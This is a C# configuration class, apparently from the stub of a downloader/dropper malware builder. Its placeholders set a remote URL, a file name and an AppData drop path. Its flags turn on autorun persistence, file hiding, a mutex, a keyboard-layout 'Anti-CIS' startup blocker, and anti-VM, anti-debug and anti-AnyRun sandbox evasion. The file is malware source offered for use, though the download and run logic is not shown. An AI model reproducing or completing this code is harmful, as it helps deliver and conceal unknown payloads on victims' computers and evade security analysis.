using System;
using System.IO;

namespace Stub.Modules
{
    internal class config
    {
        public static string MutexValue = "%MUTEX%"; // Mutex-Value to protect against restart
        public static string FileName = "%FILENAME%"; // File name after downloading it
        public static string FileLocation = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), FileName); // File drop path
        public static string Url = "%URL%"; // Remote file url

        public static bool AutoRun = false; // Bool-value for autorun-function
        public static bool HideFile = false; // Bool-value for autorun-function
        public static bool MutexControl = false; // Option to use Mutex-Control
        public static bool AntiCIS = false; // Option to use Anti-CIS (This is a startup blocker on computers with certain keyboard layouts.)
        public static bool AntiVM = false;
        public static bool AntiDebug = false; // Anti Debug functions
        public static bool AntiAnyRun = false; // AntiAnyrun functions

    }
}
